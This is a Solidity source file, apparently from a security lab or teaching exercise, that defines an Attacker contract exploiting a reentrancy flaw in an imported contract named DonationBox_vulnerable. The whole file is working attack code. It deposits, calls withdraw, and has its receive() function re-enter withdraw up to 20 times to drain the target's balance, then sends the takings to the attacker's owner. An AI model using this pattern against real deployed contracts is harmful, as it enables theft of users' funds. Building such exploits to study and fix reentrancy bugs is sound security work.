// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./DonationBox_vulnerable.sol";

contract Attacker {
    DonationBox_vulnerable public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = DonationBox_vulnerable(payable(_target));
        owner = msg.sender;
    }

    /// deposit into target (via plain call to deposit()) then call withdraw()
    function attack() external payable {
        require(msg.value > 0, "need deposit");
        // deposit into target so attacker has a credited balance
        target.deposit{value: msg.value}();

        // attempt withdraw (reentrancy WILL work due to vulnerable pattern)
        target.withdraw();
    }

    receive() external payable {
        // Reentrancy attack: drain the entire contract balance
        uint256 contractBalance = address(target).balance;
        uint256 myBalance = target.balances(address(this));
        
        // Continue attacking while there's still money in the contract and we have a balance
        if (contractBalance > 0 && myBalance > 0 && attackCount < 20) { // limit to prevent infinite gas
            attackCount++;
            target.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
